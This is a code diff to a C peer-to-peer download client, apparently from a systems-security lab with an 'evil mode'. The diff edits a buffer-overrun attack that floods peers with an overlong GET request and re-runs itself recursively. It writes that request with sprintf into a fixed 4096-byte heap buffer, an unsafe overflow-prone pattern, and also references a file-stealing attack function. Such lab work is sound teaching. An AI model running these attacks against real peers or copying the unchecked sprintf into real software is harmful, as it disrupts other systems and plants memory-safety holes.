@@ -719,7 +719,11 @@ static void attack_buffer_overrun(task_t *t, task_t *tracker_task)
 		long_evil_str[i] = 'a';
 	}
 	long_evil_str[i] = 0;
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", long_evil_str);
+	// osp2p_writef(t->peer_fd, "GET %s OSP2P\n", long_evil_str);
+	char *large_buffer = malloc(4096);
+	sprintf(large_buffer, "GET %s OSP2P\n", long_evil_str);
+	size_t lb_len = strlen(large_buffer);
+	write(t->peer_fd, large_buffer, lb_len);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -786,7 +790,7 @@ static void attack_buffer_overrun(task_t *t, task_t *tracker_task)
 		unlink(t->disk_filename);
 	// recursive call
 	task_pop_peer(t);
-	task_download(t, tracker_task);
+	attack_buffer_overrun(t, tracker_task);
 }
 
 static void attack_steal_file(task_t *t, task_t *tracker_task) {
@@ -997,6 +1001,7 @@ int main(int argc, char *argv[])
 	}
 
 	if (evil_mode) {
+		printf("bad\n");
 		for (; argc > 1; argc--, argv++) {
 			if ((t = start_download(tracker_task, argv[1]))) {
 				if (fork() == 0) {
